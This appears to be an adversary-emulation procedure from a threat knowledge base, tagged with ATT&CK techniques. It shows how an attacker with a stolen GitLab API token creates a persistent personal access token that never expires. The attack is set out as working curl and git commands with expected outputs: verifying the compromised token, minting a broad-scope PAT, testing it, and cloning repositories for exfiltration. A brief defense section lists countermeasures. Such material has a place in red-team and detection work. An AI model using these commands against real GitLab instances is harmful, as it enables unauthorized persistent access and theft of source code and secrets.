---
id: 2ae76e00-18bf-4ae6-9fb3-e3e161c19c47
name: Create-Persistent-GitLab-Personal-Access-Token-for-Compromise
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:25.273867+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Steal Application Access Token|T1528 - Steal Application Access
    Token]]
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
sub_techniques: []
tags:
  - '[[tags/Personal Access Token]]'
  - '[[tags/Source Code Management & CI/CD Compromise]]'
commands:
  - '[[commands/gitlab-create-personal-access-token]]'
platforms:
  - Web
  - IaaS
tools: []
validated: true
---

# Create-Persistent-GitLab-Personal-Access-Token-for-Compromise

## Summary

This procedure demonstrates how an attacker with initial access to a GitLab API token can create a persistent Personal Access Token (PAT) to maintain long-term access to source code repositories and CI/CD pipelines, enabling actions like code modification, data exfiltration, or arbitrary code execution on behalf of the compromised user.

## Description

In a compromise scenario, an attacker who has obtained valid GitLab credentials or an initial API token (e.g., via phishing, social engineering, or vulnerability exploitation) can leverage the GitLab API to generate a new Personal Access Token with broad scopes. This PAT acts as a backdoor for persistence, allowing the attacker to impersonate the user without needing the original credentials. The technique aligns with stealing or abusing application access tokens, facilitating access to sensitive repositories, triggering CI/CD jobs for code execution, or extracting secrets. It targets GitLab instances (self-hosted or SaaS) and requires network access to the API endpoint. Success enables disruption of development processes, intellectual property theft, or lateral movement within the organization's DevOps environment.

## Requirements

1. Valid initial GitLab API token (PRIVATE-TOKEN) obtained through prior compromise (e.g., phishing or credential dump).
2. Network access to the GitLab instance (HTTPS on port 443).
3. Knowledge of the target user's ID in GitLab.
4. curl tool installed on the attacker's system.

## Defense

- Implement multi-factor authentication (MFA) for all GitLab accounts to prevent initial credential compromise.
- Monitor GitLab audit logs for unusual API token creation events, especially those with broad scopes or no expiration.
- Enforce least-privilege principles by limiting token scopes and setting short expiration times.
- Use webhook alerts for PAT creation and regularly rotate tokens.
- Deploy API gateways with rate limiting and anomaly detection for token-related endpoints.

## Objectives

1. Generate a long-lived Personal Access Token using an existing API token.
2. Use the new PAT to access and manipulate GitLab repositories and CI/CD pipelines.
3. Establish persistence for ongoing compromise of source code management.

## Instructions

### Step 1: Verify Initial API Token Access

**Context**: Before creating a new token, confirm the initial API token's validity by querying basic user information. This ensures the token has sufficient privileges and helps identify the target user's ID if unknown.

**Command** ([[commands/gitlab-verify-api-token]]):
```bash
curl -k --header "PRIVATE-TOKEN: $_API_TOKEN" "https://$_GITLAB_HOST/api/v4/user"
```

> This command authenticates with the GitLab API to fetch the current user's details. Replace $_API_TOKEN with the compromised token and $_GITLAB_HOST with the GitLab instance URL. If successful, it returns JSON with user ID and permissions, confirming access. If it fails (e.g., 401 Unauthorized), the initial token is invalid—revert to obtaining credentials via other means like phishing.

**Expected Output**: JSON response with user details, e.g., {"id":12345,"username":"targetuser"}.

### Step 2: Create the Persistent Personal Access Token

**Context**: Use the validated API token to POST a request creating a new PAT with desired scopes (api, read_repository, write_repository) and no expiration for persistence. This token can then be used independently for malicious actions.

**Command** ([[commands/gitlab-create-personal-access-token]]):
```bash
curl -k --request POST --header "PRIVATE-TOKEN: $_API_TOKEN" --data "name=$_TOKEN_NAME" --data "expires_at=" --data "scopes[]=api" --data "scopes[]=read_repository" --data "scopes[]=write_repository" "https://$_GITLAB_HOST/api/v4/users/$_USER_ID/personal_access_tokens"
```

> This curl command creates the PAT via the GitLab API. Parameters include the token name for identification, blank expiration for indefinite validity, and scopes for full repository and API access. The endpoint targets the specific user's PAT creation path. Upon success, the response includes the new token value—store it securely for future use. Decision point: If the user ID is unknown, use Step 1 output; otherwise, enumerate via API if privileges allow.

**Expected Output**: JSON with the new token, e.g., {"id":67890,"token":"glpat-XXXXXXXXXXXXXXXXXXXX","name":"user-persistence-token"}.

### Step 3: Verify and Test the New PAT

**Context**: Test the new PAT by using it to list repositories, confirming it grants the intended access without relying on the original token.

**Command** ([[commands/gitlab-list-repositories-with-pat]]):
```bash
curl -k --header "PRIVATE-TOKEN: $_NEW_PAT" "https://$_GITLAB_HOST/api/v4/projects"
```

> This verifies the PAT by fetching a list of accessible projects. Replace $_NEW_PAT with the created token. Success indicates persistence is established; failure (e.g., 403) means insufficient scopes—recreate with broader permissions if possible.

**Expected Output**: JSON array of projects, e.g., [{"id":111,"name":"project1",...}].

### Step 4: Use PAT for Compromise Actions

**Context**: With the PAT, perform malicious actions like cloning sensitive repos or triggering CI/CD jobs. This step demonstrates exfiltration or execution.

**Command** ([[commands/gitlab-clone-repository-with-pat]]):
```bash
git clone https://oauth2:$_NEW_PAT@$_GITLAB_HOST/user/project.git
```

> Clone a target repository using the PAT for authentication. This allows downloading source code. For CI/CD abuse, use the API to trigger pipelines with arbitrary payloads.

**Expected Output**: Local clone of the repository with source code accessible.
